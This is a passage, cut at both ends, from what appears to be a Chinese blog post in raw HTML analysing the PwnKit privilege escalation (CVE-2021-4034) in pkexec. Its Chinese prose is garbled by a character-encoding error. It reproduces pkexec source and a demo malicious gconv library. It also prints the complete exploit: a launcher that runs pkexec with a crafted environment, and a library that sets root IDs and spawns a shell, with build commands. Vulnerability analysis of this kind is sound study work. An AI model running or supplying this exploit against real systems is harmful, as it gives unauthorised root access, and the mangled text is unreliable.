class=\"number\">7</span>]: <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n<p>argc æ˜¯è‡ªåŠ¨è®¡ç®—çš„</p>\n<h4 id=\"agrvä¸ä¼ å…¥çš„æƒ…å†µ\"><a class=\"markdownIt-Anchor\" href=\"#agrvä¸ä¼ å…¥çš„æƒ…å†µ\">#</a> agrv ä¸ä¼ å…¥çš„æƒ…å†µï¼Ÿ</h4>\n<p>ä¿®æ”¹ä¸º <code>char* const argv[] = &#123;NULL&#125;</code> <br>\n å°±æ²¡æœ‰ argc äº†ï¼Œè€Œ <code>argv[1]</code>  æ˜¯ <code>environ[0]</code></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">0</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: <span class=\"function\"><span class=\"literal\">NULL</span></span></span><br><span class=\"line\"><span class=\"function\">Segmentation <span class=\"title\">fault</span> <span class=\"params\">(core dumped)</span></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"å…³äºè°ƒç”¨iconvçš„åŠæ³•\"><a class=\"markdownIt-Anchor\" href=\"#å…³äºè°ƒç”¨iconvçš„åŠæ³•\">#</a> å…³äºè°ƒç”¨ iconv çš„åŠæ³•</h3>\n<p>å¦‚æœåŠ«æŒäº† <code>GCONV_PATH</code>  å°±éœ€è¦è°ƒç”¨ <code>iconv()</code>  æ‰è¡Œï¼Œåœ¨ <code>pkexec.c</code>  æºç  369 è¡Œä½ç½®</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> gboolean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">validate_environment_variable</span> <span class=\"params\">(<span class=\"type\">const</span> gchar *key,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                               <span class=\"type\">const</span> gchar *value)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  gboolean ret;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Generally we bail if any environment variable value contains</span></span><br><span class=\"line\"><span class=\"comment\">   *</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;/&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;%&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;..&#x27; substrings</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (key != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (value != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;XAUTHORITY&quot;</span>) != <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;/&quot;</span>) != <span class=\"literal\">NULL</span>) ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;%&quot;</span>) != <span class=\"literal\">NULL</span> ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;..&quot;</span>) != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                   <span class=\"string\">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class=\"line\">                   key);</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                  <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value)) <span class=\"comment\">// SHELLå€¼ä¸åˆæ³• è°ƒç”¨g_printerr</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                     <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœæ„é€ äº†ä¸€ä¸ªé”™è¯¯çš„ <code>SHELL</code>  ç¯å¢ƒå˜é‡ï¼Œå°±ä¼šè°ƒç”¨ <code>g_printerr</code> ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨ <code>XAUTHORITY</code>  æ¥æ‰“ï¼‰<br>\nè€Œ <code>g_printerr</code>  é»˜è®¤æ˜¯ <code>UTF-8</code>  æ ¼å¼ï¼Œä»–ä¼šæ£€æŸ¥ <code>CHARSET</code>  å˜é‡ï¼Œå¯¹è¾“å‡ºæ ¼å¼è¿›è¡Œè½¬ç ï¼Œå°±ä¼šè°ƒç”¨ <code>iconv</code> ï¼Œç„¶å <code>iconv</code>  ä¼šè°ƒç”¨ <code>iconv_open</code>  åˆå§‹åŒ–ï¼Œ <code>iconv_open</code>  ä¼šæ ¹æ® <code>GCONV_PATH</code>  æ‰¾åˆ° <code>gconv-modules</code>  æ–‡ä»¶ï¼Œå†æ ¹æ® <code>gconv-modules</code>  æ–‡ä»¶çš„æŒ‡ç¤ºæ‰¾åˆ°å‚æ•°å¯¹åº”å­—ç¬¦é›†çš„ so åº“ï¼Œè°ƒç”¨ so åº“ä¸­çš„ <code>gconv()</code>  å’Œ <code>gonv_init()</code>  å‡½æ•°ã€‚</p>\n<h2 id=\"åˆ©ç”¨æ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨æ–¹æ³•\">#</a> åˆ©ç”¨æ–¹æ³•</h2>\n<ol>\n<li>åˆ›å»ºä¸€ä¸ª <code>GCONV_PATH=.</code>  çš„ç›®å½•</li>\n<li>åœ¨ä¸Šé¢ç›®å½•ä¸‹åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„åº“</li>\n<li>åœ¨æœ¬ç›®å½•ä¸‹åˆ›å»º <code>gconv-modules</code>  æ–‡ä»¶ï¼Œå†™å…¥ <code>module UTF-8// PWNKIT// pwnkit 1</code></li>\n<li>è®¾ç½®ç¯å¢ƒå˜é‡\n<ol>\n<li>ç¬¬ä¸€ä¸ªæ˜¯æ¶æ„åº“ <code>pwnkit.so:.</code></li>\n<li>ç¬¬äºŒä¸ªç¯å¢ƒå˜é‡  <code>PATH=GCONV_PATH=.</code>  è¿™æ ·  <code>g_find_program_in_path</code>  å‡½æ•°ç»„åˆå‡ºçš„è·¯å¾„å°±æ˜¯ <code>GCONV_PATH=./pwnkit.so:.</code>  ï¼ˆ <code>PATH</code> + <code>NAME</code> = <code>GCONV_PATH=.</code> + <code>/</code> + <code>pwnkit.so:.</code> ï¼‰</li>\n<li><code>CHARSET=PWNKIT</code> ï¼ŒæŒ‡å®šå­—ç¬¦é›†ä¸º <code>pwnkit</code></li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>å¦‚ç¯å¢ƒå˜é‡ â€œPATH=nameâ€ï¼Œå¦‚æœ name ç›®å½•å­˜åœ¨ï¼Œå¹¶ä¸” name ç›®å½•ä¸‹ä¹Ÿæœ‰ value å¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆ envp [0] çš„ä¾¿æŒ‡å‘ name/valueï¼›<br>\nå¦‚ç¯å¢ƒå˜é‡è®¾ç½®ä¸º â€œPATH=name=.â€ï¼Œå¹¶ä¸” â€œname=.â€ ç›®å½•ä¸‹ä¹Ÿæœ‰ value å¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆ envp [0] çš„ä¾¿æŒ‡å‘ â€œname=./valueâ€ã€‚</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  argv[n] = path;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯¹ç¯å¢ƒå˜é‡çš„å›å†™</p>\n<h3 id=\"æµç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#æµç¨‹\">#</a> æµç¨‹</h3>\n<ol>\n<li>execve æ‰§è¡Œ pkexecï¼Œæ— å‚ä¼ å…¥ï¼Œé€ æˆè¶Šç•Œé”™è¯¯æ‰§è¡Œ <code>environ[0]</code></li>\n<li>612 è¡Œ argv [1] è¶Šç•Œè®¿é—®çš„æ˜¯ envp [0]ï¼Œè·å–åˆ° value å€¼ï¼Œå’Œ path ç»„åˆåå†™å›ï¼›ï¼ˆå®ç°äº†ä¸€æ¬¡æ‰¾åˆ°è·¯å¾„çš„å†™å…¥ï¼‰æ­¤æ—¶ <code>GCONV_PATH</code>  å·²ç»è¢«ç¯¡æ”¹</li>\n<li>æ£€æµ‹åˆ° <code>SHELL</code>  å˜é‡é—®é¢˜ï¼Œè°ƒç”¨ <code>g_printerr</code></li>\n<li>æ ¹æ® <code>CHARSET</code>  å˜é‡ï¼Œéœ€è¦è½¬ç ï¼Œè°ƒç”¨ <code>iconv</code> ï¼Œç„¶å <code>iconv_open</code></li>\n<li>æ ¹æ® <code>GCONV_PATH</code>  æ‰¾åˆ° <code>gconv-modules</code> , ç„¶åæ‰¾åˆ°æˆ‘ä»¬çš„æ¶æ„åº“</li>\n<li>è°ƒç”¨å‡½æ•° <code>gonv_init()</code> , ææƒæ‹¿ä¸‹ï¼</li>\n</ol>\n<h2 id=\"gconv_pathæ¼æ´demo\"><a class=\"markdownIt-Anchor\" href=\"#gconv_pathæ¼æ´demo\">#</a> GCONV_PATH æ¼æ´ demo</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// file name hack.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you be hacked alreadly!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export CHARSET=HACK</span><br><span class=\"line\">export GCONV_PATH=.</span><br><span class=\"line\"></span><br><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class=\"line\">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure>\n<p>è¿™æ ·å°±å¸ƒç½®å¥½äº†æ‰€æœ‰å‡†å¤‡ï¼Œç„¶åæ‰‹åŠ¨è°ƒç”¨ <code>iconv</code> ï¼Œè™½ç„¶æˆ‘æƒ³ç”¨ <code>g_printerr</code> ? ä½†æ˜¯ç¼–è¯‘ä¸é€šï¼Ÿï¼Ÿ<br>\nhackedï¼</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class=\"line\">you be hacked alreadly!</span><br><span class=\"line\">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class=\"line\">Aborted (core dumped)</span><br></pre></td></tr></table></figure>\n<h3 id=\"moduleè¯­æ³•\"><a class=\"markdownIt-Anchor\" href=\"#moduleè¯­æ³•\">#</a> module è¯­æ³•</h3>\n<p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html\">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module AAAA// BBBB// name 1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ä» AAAAç¼–ç åˆ° BBBBç¼–ç  æ ¹æ®name.soè§„åˆ™ æ¶ˆè€—castå€¼ä¸º1</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶å <code>iconv</code>  ä¸çŸ¥é“ <code>CHARSET</code>  ä¸­çš„ <code>HACK</code>  æ˜¯ä»€ä¹ˆå­—ç¬¦é›†ï¼Œå°±ä¼šæ‰¾åˆ° <code>GCONV_PATH</code>  è·¯å¾„ä¸‹çš„ <code>gconv_modules</code>  å»æ‰¾è§£ç å·¥å…·ï¼Œç„¶åå°±è½å…¥æˆ‘ä»¬çš„æ¶æ„åº“äº†ï¼Œæ‰€ä»¥èƒ½æ§åˆ¶ <code>GCONV_PATH</code>  å°±èƒ½æ¶æ„ä»£ç æ‰§è¡Œ</p>\n<h2 id=\"åˆ†æpoc\"><a class=\"markdownIt-Anchor\" href=\"#åˆ†æpoc\">#</a> åˆ†æ POC</h2>\n<h3 id=\"makeåšçš„äº‹\"><a class=\"markdownIt-Anchor\" href=\"#makeåšçš„äº‹\">#</a> make åšçš„äº‹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class=\"line\">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class=\"line\">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class=\"line\">mkdir -p GCONV_PATH=.</span><br><span class=\"line\">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure>\n<p>å…ˆæ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº† <code>pwnkit.so</code>  çš„åº“<br>\nç„¶åç¼–è¯‘äº† <code>cve-2021-4034</code> <br>\n ç„¶åä¼ å…¥ä¸€å¥è¯ç»™ <code>gconv-modules</code> <br>\n åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåå­—ä¸º <code>GCONV_PATH=.</code> <br>\n æœ€å cp <code>/usr/bin/true</code>  åˆ° <code>GCONV_PATH=.</code>  æ–‡ä»¶å¤¹è·¯å¾„ä¸‹çš„ <code>pwnkit.so:.</code>  é‡Œå» <code>-f</code>  æ˜¯ force å¼ºåˆ¶æŠŠ <code>/usr/bin/true</code>  è¿™ä¸ªæ–‡ä»¶ cp åˆ°ç›®æ ‡è·¯å¾„ï¼Œå› ä¸º <code>pkexec</code>  è¦æ‰§è¡Œ <code>PATH</code>  è·¯å¾„ä¸‹çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±å¿…é¡»è®© pkexec ç©ºæ‰§è¡Œï¼Œæ‰€ä»¥ç›®æ ‡å°±è¢«æ›¿æ¢æˆ <code>true</code> ï¼Œæ€ä¹ˆæ‰§è¡Œéƒ½ä¸ä¼šå‡ºé”™<br>\nå½“å‰ç›®å½•ç»“æ„</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.c</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.sh</span><br><span class=\"line\">â”œâ”€â”€ dry-run</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ dry-run-cve-2021-4034.c</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit-dry-run.c</span><br><span class=\"line\">â”œâ”€â”€ LICENSE</span><br><span class=\"line\">â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.c</span><br><span class=\"line\">â””â”€â”€ README.md</span><br></pre></td></tr></table></figure>\n<p>make ä¹‹åçš„</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.c</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.sh</span><br><span class=\"line\">â”œâ”€â”€ dry-run</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ dry-run-cve-2021-4034.c</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit-dry-run.c</span><br><span class=\"line\">â”œâ”€â”€ gconv-modules</span><br><span class=\"line\">â”œâ”€â”€ GCONV_PATH=.</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit.so:.</span><br><span class=\"line\">â”œâ”€â”€ LICENSE</span><br><span class=\"line\">â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.c</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.so</span><br><span class=\"line\">â””â”€â”€ README.md</span><br></pre></td></tr></table></figure>\n<h3 id=\"cve-2021-4034c\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-4034c\">#</a> cve-2021-4034.c</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include &lt;unistd.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char **argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar * const args[] = &#123;</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tchar * const environ[] = &#123;</span><br><span class=\"line\">\t\t&quot;pwnkit.so:.&quot;,</span><br><span class=\"line\">\t\t&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class=\"line\">\t\t&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class=\"line\">\t\t&quot;CHARSET=PWNKIT&quot;,</span><br><span class=\"line\">\t\t&quot;GIO_USE_VFS=&quot;,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\treturn execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ªç¯å¢ƒå˜é‡æŒ‡å‘ <code>pwnkit.so:.</code> ï¼Œæ‹¼æ¥åå°±æ˜¯ <code>GCONV_PATH=./pwnkit.so:.</code> <br>\n <code>:</code>  çš„ä½œç”¨æˆ‘åœ¨ç½‘ä¸Šéƒ½æ²¡æŸ¥åˆ°å¾ˆå¥½çš„ä»‹ç»ï¼Œæˆ‘ç†è§£ä¸ºäºŒçº§æŒ‡é’ˆä¼šéå†ç”± <code>:</code>  åˆ†å‰²çš„è·¯å¾„ï¼Œï¼Œï¼Œ<br>\nä¹Ÿå°±æ˜¯ç¬¬äºŒè½®å¾ªç¯ä¼šå˜æˆ <code>GCONV_PATH=.</code> ï¼Œå¼•å¯¼å‘å½“æ—¶çš„æ¶æ„åº“</p>\n<h3 id=\"pwnkitc\"><a class=\"markdownIt-Anchor\" href=\"#pwnkitc\">#</a> pwnkit.c</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> args[] = &#123; <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> environ[] = &#123; <span class=\"string\">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>], args, environ);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªå°±æ˜¯ä¼ªé€ çš„ <code>gconv-mudules</code>  ä¸‹çš„ <code>so</code>  æ–‡ä»¶ï¼Œä¼šæ‰§è¡Œ <code>gconv</code>  å’Œ <code>gconv_init</code> <br>\n è¿™ä¸ª <code>PATH</code>  å°±æ˜¯å¤šä¸ªå¯èƒ½çš„ bin ç›®æ 